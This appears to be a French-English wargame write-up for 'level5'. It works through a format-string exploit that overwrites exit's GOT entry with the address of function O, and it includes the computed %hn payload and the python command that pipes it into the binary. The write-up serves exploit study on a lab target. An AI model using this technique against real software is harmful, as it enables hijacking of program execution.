adresse de O : 0x080484a4 --> \xa4\x84\x04\x08   
(HELLO Func : 080484cb --> \xcb\x84\x04\x08)

adresse de l'exit du GOT : 08049838 --> \x38\x98\x04\x08   
(080498ac --> \xac\x98\x04\x08)


Le but est de changer la valeur pointee par le exit du GOT par l'adresse de la fonction O


    \x38\x98\x04\x08\xae\x98\x04\x08%<val1>x%4$hn%<val2>x%5$hn

On veut ecrire l'adresse du O : 0x080484a4


- Low order bytes = 84a4 (33956 in decimal)
- High order bytes = 0804 (2052 in decimal)

However, the high order bytes is inferior to the low order so, we’ll write the high order first! We just need to invert the addresses where we want to write! Let’s do some math:


- High order bytes = 0804 (2052 in decimal). Minus the 8 bytes for the addresses = 2044 (7FC en hexa)
- Low order bytes = 84a4 (33956 in decimal). Minus the 2052 bytes we already wrote = 31904 (7CC7 en hexa)

son exploit : \xae\x98\x04\x08\xac\x98\x04\x08%2044x%4$hn%31943x%5$hn

Notre exploit :
\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn

(On mets deux fois l'adresse du exit, mais en premier on fait + 2 bytes a la fin de l'adresse)

Commande a lancer : 

> (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' ; cat -) | ./level5


# Sources : 

About the Code Execution Redirect exploit :

- https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect
